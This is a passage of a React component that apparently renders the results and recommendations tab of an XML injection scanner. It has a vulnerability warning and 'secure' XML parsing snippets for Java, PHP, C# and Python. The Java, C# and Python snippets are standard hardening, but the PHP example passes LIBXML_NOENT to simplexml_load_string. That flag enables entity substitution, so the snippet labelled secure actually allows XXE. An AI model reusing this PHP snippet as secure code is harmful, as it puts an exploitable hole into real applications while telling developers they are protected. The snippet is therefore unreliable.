                  <Shield className="h-12 w-12 text-green-500 mb-4" />
                  <h4 className="text-md font-tech text-green-500 mb-2">No Successful Payloads</h4>
                  <p className="text-sm font-mono text-center max-w-md text-muted-foreground">
                    No successful XML injection payloads were detected during the scan.
                    This suggests the target is not vulnerable to the tested XML injection attacks.
                  </p>
                </div>
              )}
            </TabsContent>
            
            <TabsContent value="recommendations" className="space-y-4">
              <div className="p-4 bg-background rounded-md border border-secondary/20">
                <h4 className="text-sm font-tech mb-4">Security Recommendations</h4>
                
                <div className="space-y-3">
                  {scanResults.recommendations.map((recommendation: string, i: number) => (
                    <div key={i} className="flex items-start gap-2">
                      <CheckCircle2 className="h-4 w-4 text-green-500 mt-0.5" />
                      <p className="text-sm font-mono">{recommendation}</p>
                    </div>
                  ))}
                </div>
                
                {scanResults.vulnerable && (
                  <div className="mt-6 p-3 bg-amber-500/10 rounded-md border border-amber-500/30">
                    <div className="flex items-start gap-2">
                      <AlertTriangle className="h-4 w-4 text-amber-500 mt-0.5" />
                      <div>
                        <p className="text-sm font-tech text-amber-500">Critical Security Issue</p>
                        <p className="text-xs font-mono mt-1">
                          XML injection vulnerabilities can lead to:
                        </p>
                        <ul className="list-disc list-inside text-xs font-mono mt-2 space-y-1">
                          <li>Unauthorized access to sensitive files</li>
                          <li>Server-side request forgery (SSRF)</li>
                          <li>Denial of service (DoS) attacks</li>
                          <li>Data theft or manipulation</li>
                          <li>Authentication bypass</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                )}
              </div>
              
              <div className="p-4 bg-background rounded-md border border-secondary/20">
                <h4 className="text-sm font-tech mb-3">Secure Coding Examples</h4>
                
                <Accordion type="single" collapsible className="w-full">
                  <AccordionItem value="item-1" className="border-secondary/20">
                    <AccordionTrigger className="text-xs font-tech text-accent hover:no-underline">
                      Java - Disable XXE Processing
                    </AccordionTrigger>
                    <AccordionContent>
                      <pre className="text-xs font-mono p-3 bg-secondary/5 rounded overflow-x-auto">
{`// Secure XML parsing in Java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
try {
    // Disable XXE
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    dbf.setXIncludeAware(false);
    dbf.setExpandEntityReferences(false);
    
    // Now use the factory to create a DocumentBuilder, etc.
} catch (ParserConfigurationException e) {
    // Handle exception
}`}
                      </pre>
                    </AccordionContent>
                  </AccordionItem>
                  
                  <AccordionItem value="item-2" className="border-secondary/20">
                    <AccordionTrigger className="text-xs font-tech text-accent hover:no-underline">
                      PHP - Secure XML Parsing
                    </AccordionTrigger>
                    <AccordionContent>
                      <pre className="text-xs font-mono p-3 bg-secondary/5 rounded overflow-x-auto">
{`// Secure XML parsing in PHP
libxml_disable_entity_loader(true); // Disable external entities in PHP

// Create a new DOMDocument
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NONET); // LIBXML_NONET prevents network access

// Or for SimpleXML
$simplexml = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_NONET);`}
                      </pre>
                    </AccordionContent>
                  </AccordionItem>
                  
                  <AccordionItem value="item-3" className="border-secondary/20">
                    <AccordionTrigger className="text-xs font-tech text-accent hover:no-underline">
                      C# - Preventing XXE
                    </AccordionTrigger>
                    <AccordionContent>
                      <pre className="text-xs font-mono p-3 bg-secondary/5 rounded overflow-x-auto">
{`// Secure XML parsing in C#
using System.Xml;

XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit; // Disable DTD processing
settings.XmlResolver = null; // Disable external entity resolution
settings.MaxCharactersFromEntities = 1024; // Limit entity expansion

// Use the settings when creating an XmlReader
using (XmlReader reader = XmlReader.Create(stream, settings))
{
    // Process the XML
}`}
                      </pre>
                    </AccordionContent>
                  </AccordionItem>
                  
                  <AccordionItem value="item-4" className="border-secondary/20">
                    <AccordionTrigger className="text-xs font-tech text-accent hover:no-underline">
                      Python - Secure XML
                    </AccordionTrigger>
                    <AccordionContent>
                      <pre className="text-xs font-mono p-3 bg-secondary/5 rounded overflow-x-auto">
{`# Secure XML parsing in Python
from defusedxml import ElementTree
from defusedxml.minidom import parseString

# Use defusedxml instead of built-in libraries
tree = ElementTree.parse(xml_file)

# Or for minidom
dom = parseString(xml_string)

# defusedxml automatically protects against XXE attacks`}
                      </pre>
                    </AccordionContent>
                  </AccordionItem>
                </Accordion>
              </div>
            </TabsContent>
          </Tabs>
        </Card>
      )}
    </div>
  );
}